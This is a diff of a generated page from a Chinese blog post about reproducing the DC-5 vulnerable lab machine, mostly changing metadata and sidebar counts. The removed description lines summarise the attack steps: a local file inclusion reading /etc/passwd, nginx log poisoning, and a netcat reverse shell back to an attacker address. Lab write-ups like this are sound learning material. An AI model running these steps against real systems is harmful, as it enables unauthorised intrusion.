@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="1arp-scan -l 192.168.130.145 1dirsearch -u 192.168.130.145 1file&#x3D;&#x2F;etc&#x2F;passwd 1var&#x2F;log&#x2F;nginx&#x2F;access.log 1nc 192.168.130.128 4444 -e &#x2F;bin&#x2F;sh 1nc -lvnp 4444 1python -c &#x27;import pty;pty.spawn(&quot;&#x2F;">
+  <meta name="description" content="本次学习的是DC-5靶机">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DC-5靶机复现">
 <meta property="og:url" content="http://zh1yu.xyz/2025/06/06/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="知鱼的Blog">
-<meta property="og:description" content="1arp-scan -l 192.168.130.145 1dirsearch -u 192.168.130.145 1file&#x3D;&#x2F;etc&#x2F;passwd 1var&#x2F;log&#x2F;nginx&#x2F;access.log 1nc 192.168.130.128 4444 -e &#x2F;bin&#x2F;sh 1nc -lvnp 4444 1python -c &#x27;import pty;pty.spawn(&quot;&#x2F;">
+<meta property="og:description" content="本次学习的是DC-5靶机">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-06-06T12:03:02.000Z">
-<meta property="article:modified_time" content="2025-06-06T16:28:49.230Z">
+<meta property="article:modified_time" content="2025-06-08T05:47:06.697Z">
 <meta property="article:author" content="zh1yu">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
@@ -191,7 +191,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-07 00:28:49" itemprop="dateModified" datetime="2025-06-07T00:28:49+08:00">2025-06-07</time>
+                <time title="修改时间：2025-06-08 13:47:06" itemprop="dateModified" datetime="2025-06-08T13:47:06+08:00">2025-06-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -214,7 +214,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <span id="more"></span>
+        <p> 本次学习的是DC-5靶机</p>
+<span id="more"></span>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 <p><strong>192.168.130.145</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.130.145</span><br></pre></td></tr></table></figure>
@@ -349,19 +350,19 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
